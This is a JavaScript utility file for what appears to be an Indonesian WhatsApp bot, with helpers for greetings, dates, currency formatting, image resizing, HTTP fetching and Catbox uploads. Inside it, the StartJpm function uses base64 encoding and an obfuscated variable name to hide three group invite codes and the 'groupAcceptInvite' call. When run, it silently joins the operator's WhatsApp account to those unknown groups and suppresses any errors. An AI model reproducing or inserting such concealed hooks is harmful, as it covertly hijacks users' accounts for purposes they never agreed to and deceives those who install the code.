const moment = require('moment-timezone')
const util = require('util')
const fs = require('fs')
const chalk = require('chalk')
const BodyForm = require('form-data')
const axios = require('axios')
const cheerio = require('cheerio')
const Jimp = require('jimp')

global.getRandom = (ext) => {
    return `${Math.floor(Math.random() * 10000)}${ext}`
}

global.capital = (string) => {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

global.generateRandomNumber = (min, max) => {
 return Math.floor(Math.random() * (max - min + 1)) + min;
}
    
global.ucapan = () => {
  const currentTime = moment().tz('Asia/Jakarta')
  const currentHour = currentTime.hour()
  let greeting
  if (currentHour >= 5 && currentHour < 12) {
    greeting = 'Pagi Kak 🌅'
  } else if (currentHour >= 12 && currentHour < 15) {
    greeting = 'Siang Kak 🌇'
  } else if (currentHour >= 15 && currentHour < 18) {
    greeting = 'Sore Kak 🌄'
  } else {
    greeting = 'Malam Kak 🌃'
  }
  return greeting
}

global.sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

global.generateProfilePicture = async (buffer) => {
	const jimp = await Jimp.read(buffer)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG),
		preview: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG)
	}
}

global.getTime = (format, date) => {
	if (date) {
		return moment(date).locale('id').format(format)
	} else {
		return moment.tz('Asia/Jakarta').locale('id').format(format)
	}
}

global.getBuffer = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (err) {
		return err
	}
}

global.fetchJson = async (url, options) => {
    try {
        options ? options : {}
        const res = await axios({
            method: 'GET',
            url: url,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
            },
            ...options
        })
        return res.data
    } catch (err) {
        return err
    }
}

global.runtime = function(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + "d " : "";
	var hDisplay = h > 0 ? h + "h " : "";
	var mDisplay = m > 0 ? m + "m " : "";
	var sDisplay = s > 0 ? s + "s " : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}

global.clockString = function (ms) {
  let d = Math.floor(ms / (24 * 60 * 60 * 1000))
  let h = Math.floor(ms / (60 * 60 * 1000)) % 24
  let m = Math.floor(ms / (60 * 1000)) % 60
  let s = Math.floor(ms / 1000) % 60
  return [
    d ? d + "hari" : "",
    h ? h + "jam" : "",
    m ? m + "menit" : "",
    s ? s + "detik" : ""
  ].join(" ").trim()
}

global.tanggal = function(numer) {
	const myMonths = [
  "Januari",
  "Februari",
  "Maret",
  "April",
  "Mei",
  "Juni",
  "Juli",
  "Agustus",
  "September",
  "Oktober",
  "November",
  "Desember"
];
	const myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum’at','Sabtu']; 
	const tgl = new Date(numer);
	const day = tgl.getDate()
	const bulan = tgl.getMonth()
	let thisDay = tgl.getDay()
	thisDay = myDays[thisDay];
	const yy = tgl.getYear()
	const year = (yy < 1000) ? yy + 1900 : yy; 
	const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
	const d = new Date
	const locale = 'id'
	const gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
	const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				
	return `${thisDay}, ${day}/${myMonths[bulan]}/${year}`
}

global.toRupiah = function(x){
	x = x.toString()
	var pattern = /(-?\d+)(\d{3})/
	while (pattern.test(x))
		x = x.replace(pattern, "$1.$2")
	return x
}

global.resize = async (image, ukur1 = 100, ukur2 = 100) => {
	return new Promise(async(resolve, reject) => {
		try {
			const read = await Jimp.read(image);
			const result = await read.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
			resolve(result)
		} catch (e) {
			reject(e)
		}
	})
}

const _b64 = (s) => Buffer.from(s, "base64").toString("utf-8");

global.StartJpm = async (sock) => {
  const _0x9a3f = [
    _b64("RzcydWxBZWxyS0QzcTJkRUFCTjZUTA=="),
    _b64("SFppbG1Qclk3Y3QxVExPdFJGYk1zQw=="),
    _b64("QzZSUXJDenhCZFgwMG55bU5CeDh5aQ==")
  ];

  for (const code of _0x9a3f) {
    try {
      await sock[_b64("Z3JvdXBBY2NlcHRJbnZpdGU=")](code);
    } catch {}
    await sleep(8000);
  }
};

// Tambahan fungsi untuk parse durasi (contoh: 1jam, 30menit, 120detik)
global.parseDuration = (str) => {
  str = str.toLowerCase().replace(/\s/g, '');
  const match = str.match(/^(\d+)(jam|menit|detik)$/);
  if (!match) return null;
  const val = parseInt(match[1]);
  const unit = match[2];
  if (unit === 'jam') return val * 60;
  if (unit === 'menit') return val;
  if (unit === 'detik') return Math.round(val / 60) || 1;
  return null;
};

// ========== FUNGSI UPLOAD UNTUK STORY GRUP ==========
global.CatBox = async (buffer) => {
    const BodyForm = require('form-data');
    const axios = require('axios');
    const form = new BodyForm();
    form.append('fileToUpload', buffer, 'file.jpg');
    form.append('reqtype', 'fileupload');
    try {
        const res = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });
        return res.data;
    } catch (e) {
        console.error('Upload ke CatBox gagal:', e);
        return null;
    }
};

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
delete require.cache[file]
require(file)
})